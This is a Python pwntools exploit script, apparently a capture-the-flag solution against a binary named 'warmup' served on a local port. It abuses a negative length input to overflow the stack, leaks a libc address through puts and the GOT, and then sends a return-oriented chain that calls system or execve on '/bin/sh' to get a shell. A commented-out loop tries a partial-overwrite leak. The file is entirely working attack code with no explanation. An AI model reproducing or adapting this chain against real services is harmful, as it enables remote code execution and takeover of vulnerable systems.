from pwn import *
import time

pop_rdi = 0x23835
ret = 0x401268
binsh = 0x198031
system = 0x493d0

puts_plt = 0x0000000000401030
puts_got = 0x404000
pop_rdi_rbp = 0x000000000040116b


# while True:
#     try:
#         p = process('./warmup')
#         # p = remote('localhost', 51337)
#         p.recvuntil(b'long? >> ')
#         # p.interactive()
#         p.sendline(b'-1')
#         p.recvuntil(b'story >>')
#         p.send(b'A'*40+p64(ret)*20+b'\x20\x34')
#         x=b''
#         addrs = []
#         x = p.recvuntil(b'long? >>')[1:]
#         time.sleep(0.2)
#         print(x)
#         # p.interactive()
#         for i in range(0, len(x)//8, 8):
#             addrs.append(u64(x[i:i+8]))
#             print(hex(addrs[-1]), i//8)
#         libc = addrs[25] - 0x23420
#         p.sendline(b'-1')
#         p.recvuntil(b'story >>')
#         p.interactive()
#         p.sendline(b'A'*40+p64(ret)+p64(libc+pop_rdi)+p64(libc+binsh)+p64(libc+system))
#         p.interactive()
#     except KeyboardInterrupt:
#         break
#     except Exception as ex:
#         print(ex)
#         pass

# p = process('./warmup')
p = remote('127.0.0.1', 51337)
p.recvuntil(b'long? >>')
p.interactive()
p.sendline(b'-1')
p.recvuntil(b'story >>')
p.sendline(b'A'*40+p64(pop_rdi_rbp)+p64(puts_got)+p64(puts_got)+p64(puts_plt)+p64(0x0000000000401271)+p64(0x00000000004011d0))
x = p.recvuntil(b'long? >>')[1:7]+b'\x00\x00'
p.sendline(b'-1')
x = u64(x) - 0x74aa0
print(hex(x))
p.sendline(b'A'*40+p64(x+0x0000000000023835)+p64(x+binsh)+p64(x+0x0000000000025151)+p64(0)+p64(x+0x0000000000082849)+p64(0)+p64(0)+p64(x+0x00000000000d2f50))
p.interactive()